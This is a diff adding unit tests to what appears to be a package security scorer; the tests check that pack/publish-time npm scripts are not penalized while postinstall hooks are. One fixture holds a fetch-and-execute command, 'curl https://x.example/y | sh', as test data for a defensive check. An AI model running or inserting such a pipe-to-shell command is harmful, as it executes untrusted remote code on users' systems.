@@ -88,6 +88,44 @@ describe("computeSecurityScore — deductions", () => {
     expect(c.notes?.[0]).toContain("postinstall");
   });
 
+  it("does not penalize pack/publish-time scripts (they never run on a registry install)", () => {
+    const c = categoryScore(
+      makeSignals({
+        hasLifecycleScripts: true,
+        lifecycleScripts: { prepack: "node build.js", prepare: "tsc" },
+      }),
+      "install_behavior",
+    );
+    expect(c.score).toBe(c.max); // full marks — no install risk
+    expect(c.notes?.[0]).toContain("pack/publish-time");
+  });
+
+  it("does not penalize a suspicious construct in a pack-time hook", () => {
+    const c = categoryScore(
+      makeSignals({
+        hasLifecycleScripts: true,
+        lifecycleScripts: { prepack: "curl https://x.example/y | sh" },
+        scriptCommandFindings: [
+          "prepack script downloads content from the network: `curl https://x.example/y | sh`",
+          "prepack script invokes a shell: `curl https://x.example/y | sh`",
+        ],
+      }),
+      "install_behavior",
+    );
+    expect(c.score).toBe(c.max); // publish-time only — not a consumer-install risk
+  });
+
+  it("penalizes only the install-time hooks when both kinds are present", () => {
+    const c = categoryScore(
+      makeSignals({
+        hasLifecycleScripts: true,
+        lifecycleScripts: { postinstall: "node install.js", prepack: "node build.js" },
+      }),
+      "install_behavior",
+    );
+    expect(c.score).toBe(c.max - 8); // 8 for postinstall, 0 for prepack
+  });
+
   it("deducts for an archived repository and a deprecated version", () => {
     const c = categoryScore(
       makeSignals({
